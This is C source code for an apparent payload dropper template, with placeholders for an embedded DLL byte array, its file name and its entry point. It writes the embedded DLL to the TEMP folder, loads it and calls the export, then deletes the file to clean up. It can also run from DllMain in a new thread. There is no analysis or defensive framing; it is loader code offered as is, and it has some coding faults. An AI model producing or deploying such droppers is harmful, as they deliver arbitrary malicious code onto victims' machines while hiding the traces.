#include <stdio.h>
#include <Windows.h>
#include <stdbool.h>

typedef void(*DllMainEx)();

unsigned char rawData[$DataLength$] = {
	$DataByte$
};

int main()
{
	bool Conditional = false;
	char *Pathvar = getenv("TEMP");
	char *DLLName = "$DllName$";
	char *EntryPoint = "$DllMain$";

	if (Pathvar != "") {
       DLLName = strcat(Pathvar, DLLName);
	}

	remove(DLLName);

	printf("Writing dll\n");

	FILE *fp = fopen(DLLName, "wb");
   
	if (fp) {
		fwrite(rawData, 1, sizeof(rawData), fp);
		fclose(fp);
	}

	printf("Loading DLL\n");

	printf("Executing LoadLibrary\n");
	HMODULE ModuleDLL = LoadLibraryA(DLLName);
	printf("Executing GetProcAddress\n");
	DllMainEx ManagedMethod = (DllMainEx)GetProcAddress(ModuleDLL, EntryPoint);
	printf("Executing ManagedMethod\n");
	ManagedMethod();
	printf("Executing WaitForSingleObject\n");
	WaitForSingleObject(ModuleDLL, INFINITE);
	while (Conditional) { }
	printf("Ending Executing\n");
	FreeLibrary(ModuleDLL);

	printf("Cleaning Cache\n");

	int status = remove(DLLName);

	if (status == 0)
		printf("\nFile Deleted Successfully!");
	else
		printf("\nError Occurred!");
	
	return 0;
}

BOOL WINAPI DllMain(HINSTANCE dllHistance, DWORD callReason, void* reserved)
{
        switch (callReason)
        {
                case DLL_PROCESS_ATTACH:
                {
					bool AsyncMain = $AsyncThread$;

					if (AsyncMain == false) {
						main();
					}
					else {
						CreateThread(NULL, 0, &main, 0, 0, 0);
					}
                        break;
                }
                case DLL_PROCESS_DETACH:
                {
                        break;
                }
                default:
                {
                        break;
                }
        }
        return TRUE;
}
